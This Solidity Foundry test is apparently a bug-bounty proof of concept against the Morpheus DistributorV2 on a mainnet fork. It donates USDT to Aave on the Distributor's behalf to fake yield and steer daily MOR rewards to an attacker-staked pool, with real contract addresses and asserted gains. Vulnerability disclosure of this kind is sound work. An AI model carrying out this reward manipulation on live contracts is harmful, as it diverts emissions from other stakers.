// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ============================================================================
// FILING PoC — Morpheus finding A-1: Distributor manufactured-yield steering
// (Ethereum mainnet fork, pinned block 26,329,065 — see README.md)
//
// Bug (DistributorV2.distributeRewards, deployed bytecode): the daily MOR
// emission for capital pool index 0 is split across the five DepositPools
// pro-rata to *measured yield*, where measured yield is simply
// `yieldToken.balanceOf(Distributor) - lastUnderlyingBalance` (x ChainLink
// price). The contract cannot distinguish earned interest / Lido rebase
// from an unsolicited transfer-in. Anyone can therefore manufacture "yield"
// for a chosen pool — here by supplying USDT to Aave V3 with
// `onBehalfOf = Distributor`, which mints aUSDT straight to the Distributor —
// and steer the day's fixed emission to the pool they dominate as a staker.
// The donation is afterwards swept to the protocol's L1Sender as if it were
// genuine yield (the donor really loses it), but the steered MOR allocation
// is permanent and is NOT clawed back.
//
// Attacker model: a FRESH, unprivileged address. No prank as any protocol
// role, owner, or existing staker anywhere in this file. The only cheatcode
// funding is `deal` of USDT to the attacker (test scaffolding: it endows the
// fresh attacker with the capital a real attacker would bring —
// 200,000 USDT stake, recoverable, + 500 USDT donation, consumed — exactly
// the amounts stated in the report).
//
// Robustness design (why this file does not suffer the original lane PoC's
// intermittent fork failure):
//  1. The fork block is pinned INSIDE the test via createSelectFork, so the
//     run command is a bare `forge test` and cannot be pointed at the wrong
//     block by CLI flags.
//  2. At the pinned block the 24h distribution period has ALREADY elapsed
//     (rewardPoolLastCalculatedTimestamp(0) = 1,793,531,771; block timestamp
//     = 1,793,646,263; elapsed 114,492 s > 86,400 s) and every ChainLink
//     feed is still inside its allowed update delay. The setup distribution
//     that the attacker's stake triggers therefore executes with REAL feed
//     data, NO time warp and NO mocks — asserted in Phase 0/1 below.
//  3. The one unavoidable fork artefact is the SECOND distribution, which by
//     protocol design requires block.timestamp to advance >= 86,401 s past
//     the setup distribution. On a frozen fork that warp pushes every feed
//     past its allowed delay (3,600 s for stETH/ETH, 86,400 s for stables),
//     the ChainLinkDataConsumer returns 0 by design, and distributeRewards
//     reverts "DR: price for pair is zero" — for a reason orthogonal to the
//     bug. On live mainnet the same elapsed day is real time, during which
//     ChainLink heartbeats keep republishing the feeds, so the consumer
//     never sees a stale answer. This test reproduces exactly that live
//     behaviour and nothing more: after each warp it re-mocks ONLY the
//     external ChainLink aggregator contracts' `latestRoundData()` to
//     return the IDENTICAL answer that aggregator returned at the pinned
//     block (read from the real aggregator earlier in the same test run),
//     with `updatedAt` set to the current block timestamp — i.e. the
//     heartbeat republishing the same price. Feed addresses are DERIVED
//     from deployed state (Distributor -> depositPools.chainLinkPath ->
//     consumer.getPathId -> consumer.dataFeeds), never hardcoded.
//     No Morpheus contract is mocked, etched, or storage-written anywhere:
//     Distributor, DepositPool, RewardPool, the ChainLinkDataConsumer
//     (including its staleness check, which executes for real against the
//     refreshed timestamps) and Aave all run 100% deployed bytecode, and no
//     price VALUE is ever altered — only the freshness timestamp that a
//     live heartbeat would have advanced.
//  4. Alternatives were tried and rejected empirically (2026-11-03, see
//     README.md): warping backwards so the stake lands inside the previous
//     period reverts inside Aave (reserve timestamps are ahead of the
//     warped-back clock), and vm.rollFork(+1 day) is impossible because
//     the chain head at audit time is only ~200 blocks past the pinned
//     block (a real +1-day block does not exist yet) — and would in any
//     case depend on uncontrolled live distribution state.
// ============================================================================

import {Test} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {console} from "forge-std/console.sol";

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function withdrawYield(uint256 rewardPoolIndex_, address depositPoolAddress_) external;
    function withdraw(uint256 rewardPoolIndex_, address receiver_, uint256 amount_) external returns (uint256);
    function distributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
    function depositPoolAddresses(uint256 rewardPoolIndex_, uint256 index_) external view returns (address);
    function depositPools(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (address token, string memory chainLinkPath, uint256 tokenPrice, uint256 deposited, uint256 lastUnderlyingBalance, uint8 strategy, address aToken, bool isExist);
    function aavePoolAddressesProvider() external view returns (address);
    function chainLinkDataConsumer() external view returns (address);
}

interface IConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function dataFeeds(bytes32 pathId_, uint256 index_) external view returns (address);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

interface IAggregator {
    function latestRoundData() external view returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IAaveProvider {
    function getPool() external view returns (address);
}

contract FilingA1Test is Test {
    uint256 internal constant FORK_BLOCK = 26329065;

    // Deployed addresses (BOUNTY.md Appendix A / RECHECK.md). All other
    // addresses the test needs (aUSDT, Aave pool, ChainLink feeds, consumer)
    // are read from deployed state at runtime.
    IDistributor internal distributor = IDistributor(0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A);
    IDepositPool internal dpUsdt = IDepositPool(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IERC20 internal usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address internal l1Sender = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;

    address internal attacker = makeAddr("a1Attacker"); // fresh, unprivileged
    uint256 internal constant STAKE = 200_000e6; // 200,000 USDT — attacker's own capital, recoverable
    uint256 internal constant DONATION = 500e6; // 500 USDT of manufactured "yield" — consumed

    // ChainLink aggregators derived from deployed state, with the exact
    // answers they returned at the pinned block (recorded pre-warp).
    address[] internal feeds;
    int256[] internal feedAnswers;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        _deriveFeeds();
    }

    /// @dev Walk Distributor's index-0 pool registry, take each pool's
    /// configured ChainLink path string from deployed storage, resolve the
    /// path id through the consumer, and collect every aggregator address
    /// the consumer will call. No feed address is hardcoded.
    function _deriveFeeds() internal {
        IConsumer consumer = IConsumer(distributor.chainLinkDataConsumer());
        for (uint256 i = 0; i < 5; i++) {
            address pool = distributor.depositPoolAddresses(0, i);
            (, string memory path, , , , , , ) = distributor.depositPools(0, pool);
            bytes32 pathId = consumer.getPathId(path);
            for (uint256 k = 0; ; k++) {
                try consumer.dataFeeds(pathId, k) returns (address feed) {
                    if (feed == address(0)) break;
                    bool seen = false;
                    for (uint256 j = 0; j < feeds.length; j++) if (feeds[j] == feed) seen = true;
                    if (!seen) {
                        feeds.push(feed);
                        (, int256 answer, , , ) = IAggregator(feed).latestRoundData();
                        require(answer > 0, "feed answer must be positive at fork block");
                        feedAnswers.push(answer);
                    }
                } catch {
                    break;
                }
            }
        }
        require(feeds.length == 6, "expected 6 unique aggregators across the 5 paths");
    }

    /// @dev Simulate ONLY what a live ChainLink heartbeat does during the
    /// warped day: republish the SAME answer with a fresh updatedAt.
    /// Values are the exact pinned-block answers recorded in _deriveFeeds;
    /// the mock asserts that identity before installing itself.
    function _refreshFeedsAfterWarp() internal {
        for (uint256 j = 0; j < feeds.length; j++) {
            (, int256 liveAnswer, , , ) = IAggregator(feeds[j]).latestRoundData();
            // Before the mock is installed the aggregator still returns the
            // real pinned-block answer (it is stale by timestamp only, the
            // value source is untouched). After a snapshot revert mocks are
            // cleared by the caller, so this read is always the real one.
            assertEq(liveAnswer, feedAnswers[j], "aggregator value drifted - aborting");
            vm.mockCall(
                feeds[j],
                abi.encodeWithSignature("latestRoundData()"),
                abi.encode(uint80(1), feedAnswers[j], block.timestamp, block.timestamp, uint80(1))
            );
        }
    }

    /// @dev USDT approve tolerating empty returndata (SafeERC20-style),
    /// as any real USDT integrator must.
    function _approve(address spender, uint256 amount) internal {
        (bool ok, bytes memory d) = address(usdt).call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (d.length == 0 || abi.decode(d, (bool))), "approve failed");
    }

    function test_A1_ManufacturedYieldSteering() public {
        address aavePool = IAaveProvider(distributor.aavePoolAddressesProvider()).getPool();
        (, , , , , , address aUsdt, ) = distributor.depositPools(0, address(dpUsdt));
        require(aUsdt != address(0), "aUSDT resolved from deployed state");

        // ---- Phase 0: preconditions at the pinned block (no warp, no mocks)
        uint128 last0 = distributor.rewardPoolLastCalculatedTimestamp(0);
        console.log("FORK block number:", block.number);
        console.log("FORK block timestamp:", block.timestamp);
        console.log("rewardPoolLastCalculatedTimestamp(0):", uint256(last0));
        console.log("elapsed since last distribution (s):", block.timestamp - uint256(last0));
        assertGt(block.timestamp, uint256(last0) + 86400, "24h period already elapsed at fork block - no warp needed for setup");
        assertGt(feeds.length, 0, "feeds derived");

        // ---- Phase 1: attacker stakes. DepositPool.stake internally calls
        // Distributor.distributeRewards, firing the pending distribution
        // with REAL, still-fresh feed data (no warp/mocks yet). The attacker
        // is settled at the post-distribution rate, exactly like a real
        // staker joining at this block.
        deal(address(usdt), attacker, STAKE + DONATION);
        vm.startPrank(attacker);
        _approve(address(distributor), STAKE);
        dpUsdt.stake(0, STAKE, 0, address(0));
        vm.stopPrank();
        assertEq(uint256(distributor.rewardPoolLastCalculatedTimestamp(0)), block.timestamp, "setup distribution fired during stake");
        assertEq(usdt.balanceOf(attacker), DONATION, "attacker retains exactly the donation amount");

        uint256 snap = vm.snapshotState();

        // ---- Branch A (baseline): one clean day, NO donation
        vm.warp(block.timestamp + 86401);
        _refreshFeedsAfterWarp();
        uint256 a0 = distributor.distributedRewards(0, address(dpUsdt));
        distributor.distributeRewards(0);
        uint256 allocA = distributor.distributedRewards(0, address(dpUsdt)) - a0;
        uint256 rewA = dpUsdt.getLatestUserReward(0, attacker);
        console.log("BASELINE USDT pool day allocation (MOR wei):", allocA);
        console.log("BASELINE attacker pending rewards (MOR wei):", rewA);

        vm.revertToState(snap);
        vm.clearMockedCalls(); // branch B must start from un-mocked, real feed state

        // ---- Branch B (attack): same starting state, attacker first donates
        // 500 USDT of manufactured yield by supplying to Aave with
        // onBehalfOf = Distributor (aUSDT is minted straight to Distributor).
        vm.startPrank(attacker);
        _approve(aavePool, DONATION);
        IAavePool(aavePool).supply(address(usdt), DONATION, address(distributor), 0);
        vm.stopPrank();
        assertEq(usdt.balanceOf(attacker), 0, "donation left the attacker's wallet");
        assertEq(IERC20(aUsdt).balanceOf(attacker), 0, "donor holds zero aUSDT - no Aave position of its own");

        vm.warp(block.timestamp + 86401);
        _refreshFeedsAfterWarp();
        uint256 b0 = distributor.distributedRewards(0, address(dpUsdt));
        distributor.distributeRewards(0);
        uint256 allocB = distributor.distributedRewards(0, address(dpUsdt)) - b0;
        uint256 rewB = dpUsdt.getLatestUserReward(0, attacker);
        console.log("ATTACK   USDT pool day allocation (MOR wei):", allocB);
        console.log("ATTACK   attacker pending rewards (MOR wei):", rewB);
        console.log("ATTACK   pool allocation delta (MOR wei):", allocB - allocA);
        console.log("ATTACK   attacker incremental rewards (MOR wei):", rewB - rewA);

        // (a) The 500 USDT donation more than triples the USDT pool's share
        // of the day's fixed emission (baseline share is driven by ~$20 of
        // genuine USDT-pool yield that day).
        assertGt(allocB, allocA * 2, "(a) donation at least doubles USDT pool allocation");
        // (b) The attacker, as dominant staker of the pool, captures the
        // steered emission: >1,000 MOR of extra pending rewards for a
        // 500 USDT donation (exact delta logged above).
        assertGt(rewB, rewA + 1000 ether, "(b) attacker gains >1000 MOR from a 500 USDT donation");

        // ---- Phase C: cost realisation — the donation is real protocol
        // "yield" now, swept to the fixed L1Sender, and the donor has no
        // recovery path.
        uint256 attackerBefore = usdt.balanceOf(attacker);
        uint256 l1Before = usdt.balanceOf(l1Sender);
        distributor.withdrawYield(0, address(dpUsdt)); // permissionless
        uint256 swept = usdt.balanceOf(l1Sender) - l1Before;
        console.log("SWEEP    USDT forwarded to L1Sender:", swept);
        assertGe(swept, 490e6, "(c) donation swept to L1Sender as yield");
        assertEq(usdt.balanceOf(attacker), attackerBefore, "(c) donor recovered 0 via withdrawYield");

        // Direct Distributor.withdraw is DepositPool-gated: reverts.
        vm.expectRevert();
        vm.prank(attacker);
        distributor.withdraw(0, attacker, DONATION);
        // Aave withdraw of the donated position: the donor holds no aUSDT,
        // so there is nothing to redeem: reverts.
        vm.expectRevert();
        vm.prank(attacker);
        IAavePool(aavePool).withdraw(address(usdt), DONATION, attacker);
        console.log("RECOVERY direct Distributor.withdraw and Aave withdraw both reverted as expected");
    }
}
